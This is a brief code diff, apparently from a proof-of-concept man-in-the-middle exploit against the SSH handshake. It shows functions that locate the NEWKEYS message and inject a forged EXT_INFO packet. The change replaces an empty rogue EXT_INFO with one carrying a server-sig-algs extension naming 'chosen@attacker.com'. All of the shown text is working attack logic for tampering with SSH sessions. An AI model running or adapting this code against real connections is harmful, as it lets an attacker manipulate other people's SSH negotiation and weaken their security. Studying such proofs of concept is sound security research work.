@@ -50,8 +50,8 @@ newkeys_payload = b'\x00\x00\x00\x0c\x0a\x15'
 def contains_newkeys(data):
     return newkeys_payload in data
 
-# Empty EXT_INFO here to keep things simple, but may also contain actual extensions like server-sig-algs
-rogue_ext_info = unhexlify('0000000C060700000000000000000000')
+# EXT_INFO message containing server-sig-algs extension with a single algorithm chosen@attacker.com
+rogue_ext_info = unhexlify('000000380807000000010000000F7365727665722D7369672D616C67730000001363686F73656E4061747461636B65722E636F6D0000000000000000')
 def insert_rogue_ext_info(data):
     newkeys_index = data.index(newkeys_payload)
     # Insert rogue authentication request and remove SSH_MSG_EXT_INFO
